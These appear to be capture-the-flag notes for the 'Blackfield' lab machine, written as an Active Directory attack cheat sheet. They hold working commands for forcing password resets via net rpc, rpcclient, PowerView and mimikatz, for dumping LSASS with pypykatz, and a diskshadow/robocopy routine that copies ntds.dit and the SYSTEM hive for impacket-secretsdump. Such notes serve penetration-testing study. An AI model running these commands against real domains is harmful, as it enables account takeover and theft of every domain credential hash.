# Blackfield - ForceChangePassword / Backup Operator - Diskshadow

## ForceChangePassword

### Linux abuse

[image]

#### Net RPC samba

```bash
net rpc password aarti 'Password@987' -U ignite.local/raj%'Password@1' -S 192.168.1.48
```

#### pth-toolkit

```bash
pth-net rpc password "aarti" -U ignite.local/"raj"%"64FBAE31CC352FC26AF97CBDEF151E03:"BD0F21ED526A885B378895679A412387" -S 192.168.1.48
```

#### Net RPC - Rpcclient - pass the hash

```bash
rpcclient -U "ansible_dev$" --pw-nt-hash 10.129.232.167
$> setuserinfo aarti 23 Password@987
```

#### ldap_shell tool

```bash
ldap_shell ignite.local/raj:Password@1 -dc-ip 192.168.1.48
change_password aarti Password@987
```

[image]

### Windows abuse

#### Windows PowerShell - Powerview

```bash
powershell -ep bypass
Import-Module .PowerView.ps1
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
Set-DomainUserPassword -Identity 'aarti' -AccountPassword $NewPassword
```

[image]

#### Mimikatz

```bash
lsadump::setntlm /server:ignite.local /user:aarti /password:Password@9876
```

## Pypykatz dump lsass.zip

https://github.com/skelsec/pypykatz

```bash
pypykatz lsa minidump lsass.DMP
```

[image]

## Backup Operator

### diskshadow / robocopy usage for backup C:\ to Z:\

```bash
#nano vss.dsh
#unix2dos vss.dsh

set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

**Run this script:**

```bash
diskshadow /s c:\programdata\vss.dsh
```

**Grab NTDS from Z:\ dir and Impacket-secretdump:**

```bash
robocopy /b Z:\Windows\ntds . ntds.dit
download ntds.dit

reg save HKLM\SYSTEM system
download system

impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
